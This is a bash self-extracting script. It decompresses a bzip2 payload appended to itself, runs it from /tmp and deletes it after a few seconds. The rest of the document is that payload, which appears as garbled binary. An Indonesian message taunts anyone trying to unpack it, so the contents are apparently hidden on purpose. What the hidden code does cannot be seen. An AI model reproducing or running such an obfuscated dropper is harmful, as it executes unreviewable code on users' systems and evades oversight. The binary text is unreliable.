#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY7M�� ��g�� ����������@D@  P[ն�k�wYh[0ȉ4L�446�F� P#� �4�h II���4�6����&L�d10#	!&R�M5<�ɩ�z��� �C�z@6��4���i�������44�2  a1��B'�I�eCD3A2��4h�z�j�}�4��0�����X4^JLp�}�0Q�֟�W��8�bU�d���D�K,"P�`T�|�cʲE�%��n��t|/�1�ݭ^;E2=R�V>��!�qiQX�Q��.P���"��1����40ƒEVAH7�]�kU�gR���g4��V�^n�{�71Ȟ�S�$a��>J�+V(n�/G�d��.=ܭ��o���q⥧�X�3,'~���g9'�k��� P�A��9�" DϬ�A�K�F�F���Uh0�.+ɛx������n;_V�$	�1�Ã	+D��v_�NJf�`���j4U������UEB[�>Q��`����w	�y�`�6��@f @����0�LX�r�����d!._����W�9���D0mϸU@Ffg�h��sg'����CNY̺��<�IA,���\~{��ΜHM����r�X�l�$�<�y3�-Q8���E��Z4o�f���IE�.�,Ma����aC�� �D%Q�CgX��8$��`Ap�~CC&M"-P6�5N��&�jS���]	B�Q\pZ&0�1�B�&��G�e���
if�7, � m�J�j�7"P3������2��`"��@d�N���]5���_:fe%b��;ڣ+¦��ʕ�׋�ZTB<W�4�^��QN����n�mPDWn������a�#	�����8u������俩��"p�Dy�b02�l�� PNzs�;,��7�r�i,��HV��Ġ��Ǌ�D�Oz��xIwa�1�Dy�ƘVʒ��q;$�H4�q������Ժ�P:���gi���k��T�>Sig�EM	BR�HN�e��e6ݯ�.�F[%��"c�@�0Ĥ�(/HmF�L�����f��C4]�$��H�!MZR��7nh�	& ����~���aI�k�l ")*�0��hU}��/���8FCFm�5R����@�:	!�$��s��� @BpÆ)$88��]��B@�7�